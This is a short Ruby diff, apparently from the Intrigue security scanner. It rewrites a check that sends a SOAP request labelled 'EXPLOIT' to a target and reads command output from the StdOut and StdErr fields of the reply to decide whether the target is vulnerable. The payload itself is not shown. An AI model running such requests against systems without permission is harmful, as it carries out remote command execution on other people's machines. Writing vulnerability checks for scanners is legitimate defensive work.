@@ -88,19 +88,17 @@ module Intrigue
 </s:Body>
 </s:Envelope>
 EXPLOIT
-
-          #res = http_request :post , url, nil, headers, body, true, 60
-          r = Typhoeus::Request.new(
-          url,
-          method: :post,
-          body: body,
-          headers: headers,
-          ssl_verifyhost: 0,
-          ssl_verifypeer: false
-        ).run
-
-          _log "Got response #{r}"
-          require 'pry'; binding.pry
+          _log "Making exploitation request."
+          res = http_request :post , url, nil, headers, body, true, 60
+          _log "Got response! Parsing data"
+          stdout = res.body_utf8[/<p:StdOut>(.*)<\/p:StdOut>/,1]
+          stderr = res.body_utf8[/<p:StdErr>(.*)<\/p:StdErr>/,1]
+          if stdout && stderr
+            _log "Target is vulnerable! Creating issue."
+            return {stdout: stdout, stderr: stderr}
+          else
+            _log "Target appears not vulnerable."
+          end
         end
 
       end
